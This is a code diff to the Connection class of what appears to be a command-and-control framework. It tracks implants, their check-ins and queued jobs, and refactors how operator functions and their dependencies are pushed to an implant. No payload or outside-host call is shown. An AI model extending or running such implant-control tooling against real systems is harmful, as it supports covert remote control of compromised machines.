@@ -23,7 +23,7 @@ class Connection():
     def __str__(self):
         internet_addr = self.system_information['ip']
         #return f'A {self.stager.format} implant, {internet_addr}, is {self.status} and last checked in at {self.get_current_time(self.last_checkin)}.'
-        return '{:<10} {:<15} {:<10} {:<10}'.format(self.stager.format, internet_addr, self.status, self.get_current_time(self.last_checkin))
+        return '{:<10} {:<15} {:<13} {:<10}'.format(self.stager.format, internet_addr, self.status, self.get_current_time(self.last_checkin))
 
     def check_in(self):
         ip = self.system_information['ip']
@@ -47,14 +47,9 @@ class Connection():
         return 0, 'Success'
 
     def execute(self, option):
-        if option[0] not in self.loaded_functions:
-            for function in self.stager.functions.values():
-                if function.name == option[0]:
-                    function_definition = parse.quote(function.definition)
-                    self.menu_options[option[0]] = util.MenuOption(self.execute, f'{function.description}.', f'{function.option_type}', color.normal, True)
-                    self.job_queue.append(self.Job('function', f'{function_definition}'))
-                    self.loaded_functions.append(option[0])
-                    self.connection_cli.update_options(self.menu_options)
+        function = self.stager.functions[option[0]]
+        if function.name not in self.loaded_functions:
+            self.load_function(function)
         self.job_queue.append(self.Job('command', option))
         return 0, 'Success'
 
@@ -74,6 +69,17 @@ class Connection():
         self.update_options()
         self.connection_cli.run()
         return 0, 'Success'
+
+    def load_function(self, function):
+        function_definition = parse.quote(function.definition)
+        self.menu_options[function.name] = util.MenuOption(self.execute, f'{function.description}.', f'{function.option_type}', color.normal, True)
+        self.job_queue.append(self.Job('function', f'{function_definition}'))
+        self.loaded_functions.append(function.name)
+        self.connection_cli.update_options(self.menu_options)
+        if not function.dependencies:
+            return
+        for function in function.dependencies:
+            self.load_function(function)
 
     def stale(self):
         if time.time() - self.last_checkin >= 10:
